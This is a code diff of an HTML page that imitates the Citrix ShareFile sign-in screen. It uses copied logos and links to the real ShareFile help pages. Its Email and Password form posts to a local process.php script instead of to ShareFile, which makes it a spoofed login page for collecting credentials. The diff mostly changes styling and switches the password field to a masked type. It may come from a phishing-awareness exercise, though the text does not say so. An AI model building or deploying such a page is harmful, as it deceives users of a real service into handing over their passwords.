@@ -1,38 +1,42 @@
 <!DOCTYPE html>
 <html>
-	<head>
-		<title>Sharefile Login</title>
-		<link rel="stylesheet" type="text/css" href="sharefilerecode.css">
-	</head>
-	<body background="http://i68.tinypic.com/280urcx.jpg">
-		
-		
-		<div class="container">
-			<center>
-			<br><br>
-			<img src="http://i68.tinypic.com/346qs5s.png" id="prof-pic">
-			<br><br><br><br>
-			
 <style>
 input[type=text], select {
     color: grey;
     background-color: rgb(235,235,235);
     width: 100%;
-    height: 50px;
+    height: 55px;
     padding: 12px 20px;
     margin: 1px 0;
     display: inline-block;
     border: none;
+    outline:none;
     box-sizing: border-box;
+    font-size: 16px;
 }
-
+input[type=Password]{
+color: grey;
+    background-color: rgb(235,235,235);
+    width: 100%;
+    height: 55px;
+    padding: 12px 20px;
+    margin: 1px 0;
+    display: inline-block;
+    border: none;
+    outline:none;
+    box-sizing: border-box;
+    font-size: 16px;
+}
 input[type=submit] {
     width: 100%;
-    height: 50px;
+    height: 55px;
     background-color: #78be20;
     color: white;
+    outline:none;
     padding: 14px 20px;
+    font-size: 16px;
     margin: 1px 0;
+    margin-top: 8px;
     border: none;
     border-radius: none;
     cursor: pointer;
@@ -48,30 +52,44 @@ div {
     padding: 1px;
 }
 </style>
+	<head>
+		<title>Sharefile Login</title>
+		<link rel="stylesheet" type="text/css" href="sharefilerecode.css">
+	</head>
+	<body background="http://i68.tinypic.com/280urcx.jpg">
+		
+		
+		<div class="container">
+			<center>
+			<br>
+			<img src="http://i68.tinypic.com/346qs5s.png" id="prof-pic">
+			<br><br><br><br><br>
+			
 <body>
 
 <div>
-  <form action="/action_page.php">
+  <form action="/Users/akshara/Ariento/process.php">
     <input type="text" id="fname" placeholder="Email">
 
-    <input type="text" id="lname" name="lastname" placeholder="Password">
+    <input type="Password" id="lname" placeholder="Password">
   
     <input type="submit" value="Sign In">
   </form>
 </div>
 
 </body>
+<br>
  <br>
 			<a href="https://secure.sharefile.com/authentication/login#SubdomainManual" id="links">Log in with my company credentials</a>
-			<br>
+			<br><br>
 
 			<a href="https://secure.sharefile.com/authentication/login#ForgotPassword" id="links" >Forgot Password?</a>
-			<br>
+			<br><br>
 
 			<a href="https://secure.sharefile.com/_Auth/PrivacyPolicy/en.html" id="links">Privacy Policy
 			</a>
 
-			<br><br><br><br><br>
+			<br><br><br><br>
 			<img src="http://i65.tinypic.com/8z3eog.png" id="citrix"></a>
 			
 			</center>
@@ -85,7 +103,7 @@ div {
 			<tr>
     <th>
 
-    <img src="http://i67.tinypic.com/28k3hxl.png" width="45%" id="footerpics"></a>
+    <img src="http://i67.tinypic.com/28k3hxl.png" id="footerpics"></a>
     <br>
     <font id="text1">Tips and Tricks</font>
      <br><br>
